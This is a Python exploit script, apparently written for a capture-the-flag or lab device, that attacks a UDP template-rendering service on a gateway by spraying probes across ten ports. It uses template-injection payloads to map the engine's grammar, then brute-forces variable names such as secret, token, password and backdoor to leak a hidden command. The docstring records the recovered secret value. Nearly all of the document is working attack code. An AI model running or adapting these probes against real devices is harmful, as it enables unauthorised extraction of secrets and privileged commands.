import socket
import time

"""
The UDP template server hops across ports 4210-4219, so we spray each probe at
all ten and keep the first non-empty reply.

Grammar (from the diag probes below):
  {{7*7}}                 -> 49
  {{device_id}}           -> 4C4864        (real var, prints its value)
  {{uptime}}              -> <number>      (real var, prints its value)
  {{"hello"}}             -> hello         (string literals render)
  {{device_id=="4C4864"}} -> True          (comparison/equality work)
  {{bogus_xyzzy}}         -> error         (unknown identifier -> literal "error")

So a real var prints, anything unknown returns "error": enumerate names and the
secret prints directly.
  {{secret_cmd}} -> 'diag_dump Ap4mjv'
"""

GATEWAY = "192.168.4.1"
PORTS = list(range(4210, 4220))
WAIT = 0.45

def udp(payload, tries=4):
    if isinstance(payload, str):
        payload = payload.encode()
    for _ in range(tries):
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.settimeout(WAIT)
            for p in PORTS:
                try:
                    s.sendto(payload, (GATEWAY, p))
                except OSError:
                    pass
            deadline = time.time() + WAIT
            while time.time() < deadline:
                try:
                    data, _ = s.recvfrom(4096)
                    if data.strip():
                        return data.decode("utf-8", "replace").strip()
                except socket.timeout:
                    break
                except OSError:
                    continue
        time.sleep(0.1)
    return None

def tmpl(inner, tries=4):
    return udp("{{" + inner + "}}", tries)

# characterise the engine's grammar
diag = [
    "7*7",
    "device_id",
    "uptime",
    '"hello"',
    'device_id=="4C4864"',
    "bogus_xyzzy",
]
for expr in diag:
    print(f'{{{{{expr}}}}} -> {tmpl(expr)!r}')

# enumerate likely variable names; a hit is any reply that is not "error"
wordlist = [
    "cmd", "command", "secret_cmd", "secret", "token", "key", "flag",
    "diag", "diagnostic", "diagnostics", "dump", "unlock", "admin", "root",
    "auth", "pass", "password", "privileged", "priv", "access", "code", "pin",
    "airwave", "gateway", "firmware", "version", "status", "state", "config",
    "debug", "service", "factory", "hidden", "internal", "backdoor",
]
print("=" * 40)
for w in wordlist:
    r = tmpl(w, tries=2)
    if r is None:
        print(f"  {w:14} -> <no reply>")
    elif r != "error":
        print(f"  {w:14} -> {r!r}   <<< HIT")
